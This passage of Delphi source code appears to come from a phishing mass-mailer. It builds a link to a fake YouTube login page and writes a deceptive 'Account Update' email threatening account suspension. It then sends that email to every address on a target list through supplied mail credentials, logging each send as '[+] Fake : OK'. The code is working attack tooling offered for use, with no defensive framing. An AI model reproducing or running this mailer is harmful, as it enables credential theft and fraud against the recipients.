        console.Lines.Add('[+] Target : ' + mailist.Items[i2] + ' ' +
          '[+] Fake ' + ' : FAIL ');
        Form1.StatusBar1.Update;
      end;
    end;
  end;

  StatusBar1.Panels[0].text := '[+] Finished';
  Form1.StatusBar1.Update;

end;

procedure TForm1.Y2Click(Sender: TObject);
var
  i: Integer;
  i2: Integer;
  asunto: string;
  mensaje: string;
  link: string;
  linktest: string;
  nombre: string;

begin

  console.Clear;

  link := page.text;
  linktest := page.text;

  linktest := StringReplace(linktest, 'http://', 'C:\',
    [rfReplaceAll, rfIgnoreCase]);
  linktest := StringReplace(linktest, '/', '\', [rfReplaceAll, rfIgnoreCase]);
  nombre := ExtractFileName(linktest);

  link := StringReplace(link, nombre, '', [rfReplaceAll, rfIgnoreCase]);
  link := link + '/Login/Youtube/Youtube.htm';

  asunto := 'Account Update';
  mensaje := 'Dear User,' + sLineBreak +
    'Our system detected an error in your account, we strongly advise you update your account to avoid account Suspension or De-activation.'
    + sLineBreak + 'Enter here : ' + link + ' to Sign in to resolve the error.'
    + sLineBreak + 'Thanks for your co-operation.' + sLineBreak + 'Regards,' +
    sLineBreak + 'Administration';

  StatusBar1.Panels[0].text := '[+] Sending ...';
  Form1.StatusBar1.Update;

  for i2 := mailist.Items.count - 1 downto 0 do
  begin
    try
      begin
        StatusBar1.Panels[0].text := '[+] Target : ' + mailist.Items[i2] + ' ' +
          '[+] Fake' + ' : Sending ' + ' ...';
        Form1.StatusBar1.Update;

        enviate_esta(username.text, password.text, mailist.Items[i2],
          asunto, mensaje);

        console.Lines.Add('[+] Target : ' + mailist.Items[i2] + ' ' +
          '[+] Fake ' + ' : OK ');
      end;
    except
      begin
        StatusBar1.Panels[0].text := '[-] Error Sending Message ...';

        console.Lines.Add('[+] Target : ' + mailist.Items[i2] + ' ' +
          '[+] Fake ' + ' : FAIL ');
        Form1.StatusBar1.Update;
      end;
    end;
  end;

  StatusBar1.Panels[0].text := '[+] Finished';
  Form1.StatusBar1.Update;

end;

end.

// The End ?
